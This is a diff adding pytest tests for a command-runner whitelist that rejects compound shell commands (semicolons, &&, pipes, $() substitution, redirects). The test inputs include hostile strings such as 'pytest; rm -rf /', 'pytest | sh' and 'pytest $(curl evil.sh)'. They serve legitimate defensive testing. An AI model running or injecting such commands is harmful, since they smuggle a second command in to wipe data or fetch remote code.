@@ -135,3 +135,71 @@ def test_run_output_truncated_if_huge(tmp_path):
     # (на Windows команда может по-другому)
     if r.ok:
         assert len(r.stdout.encode("utf-8")) <= 1_100_000
+
+
+# ---------- P0: whitelist блокирует составные команды ----------
+
+
+def test_whitelist_rejects_semicolon(tmp_path):
+    with pytest.raises(CommandWhitelistError):
+        run_command("pytest; rm -rf /", cwd=str(tmp_path), whitelist=["pytest"])
+
+
+def test_whitelist_rejects_and(tmp_path):
+    with pytest.raises(CommandWhitelistError):
+        run_command("pytest && echo pwned", cwd=str(tmp_path), whitelist=["pytest"])
+
+
+def test_whitelist_rejects_pipe(tmp_path):
+    with pytest.raises(CommandWhitelistError):
+        run_command("pytest | sh", cwd=str(tmp_path), whitelist=["pytest"])
+
+
+def test_whitelist_rejects_dollar_paren(tmp_path):
+    with pytest.raises(CommandWhitelistError):
+        run_command("pytest $(curl evil.sh)", cwd=str(tmp_path), whitelist=["pytest"])
+
+
+def test_whitelist_rejects_redirect(tmp_path):
+    with pytest.raises(CommandWhitelistError):
+        run_command("echo hi > app_config.json", cwd=str(tmp_path), whitelist=["echo"])
+
+
+def test_whitelist_empty_still_allows_anything(tmp_path):
+    # пустой whitelist = всё разрешено (legacy-совместимость)
+    r = run_command("echo hi", cwd=str(tmp_path), timeout=5)
+    assert r.ok
+
+
+# ---------- P2: allow_shell_operators ----------
+
+
+def test_shell_ops_blocked_by_default(tmp_path):
+    with pytest.raises(CommandWhitelistError):
+        run_command(
+            "pytest && echo ok",
+            cwd=str(tmp_path),
+            whitelist=["pytest"],
+        )
+
+
+def test_shell_ops_allowed_when_opted_in(tmp_path):
+    # allow_shell_operators=True → legacy: проверяется только первый токен
+    with pytest.raises(CommandWhitelistError):
+        run_command(
+            "rm -rf / && pytest",
+            cwd=str(tmp_path),
+            whitelist=["pytest"],
+            allow_shell_operators=True,
+        )
+    # `pytest` первым токеном — пропускается (но не выполняем реально,
+    # проверяем только что не упало на whitelist'е — timeout 1, ожидаемо упадёт)
+    r = run_command(
+        "pytest --collect-only -q 2>&1 | head -1",
+        cwd=str(tmp_path),
+        timeout=10,
+        whitelist=["pytest"],
+        allow_shell_operators=True,
+    )
+    # Не важно ok или нет — главное, что не CommandWhitelistError
+    assert r.command.startswith("pytest")
